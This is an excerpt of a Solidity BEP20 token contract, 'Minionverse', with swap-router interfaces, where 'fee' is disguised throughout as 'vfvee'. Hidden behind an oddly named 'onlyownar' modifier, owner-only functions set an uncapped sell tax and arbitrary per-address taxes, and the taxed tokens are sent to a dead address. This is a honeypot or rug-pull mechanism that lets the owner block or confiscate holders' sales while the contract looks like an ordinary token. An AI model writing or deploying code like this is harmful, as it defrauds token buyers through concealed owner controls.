...
interface IUniswapV2Factory {
    ...
    function vfveeTo() external view returns (address);
    function vfveeToSetter() external view returns (address);
    ...
    function setvfveeTo(address) external;
    function setvfveeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingvfveeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingvfveeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingvfveeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingvfveeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingvfveeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Minionverse  is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellvfvee = 0;

    uint256 private _defaultBuyvfvee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipvfvee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellvfvee = _value;
    }

    function setSlipvfvee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipvfvee[_address] = _value;
    }

    function getSlipvfvee(address _address) external view onlyownar returns (uint256) {
        return _slipvfvee[_address];
    }


    function setMAccountvfvee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountvfvee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradevfveeAmount = 0;

        if (rF) {
            uint256 tradevfvee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradevfvee = _defaultSellvfvee;
                }
                if (from == uniswapV2Pair) {

                    tradevfvee = _defaultBuyvfvee;
                }
            }
            if (_slipvfvee[from] > 0) {
                tradevfvee = _slipvfvee[from];
            }

            tradevfveeAmount = _Amount.mul(tradevfvee).div(100);
        }


        if (tradevfveeAmount > 0) {
            _balances[from] = _balances[from].sub(tradevfveeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradevfveeAmount);
            emit Transfer(from, _deadAddress, tradevfveeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradevfveeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradevfveeAmount);
        emit Transfer(from, _to, _Amount - tradevfveeAmount);
    }
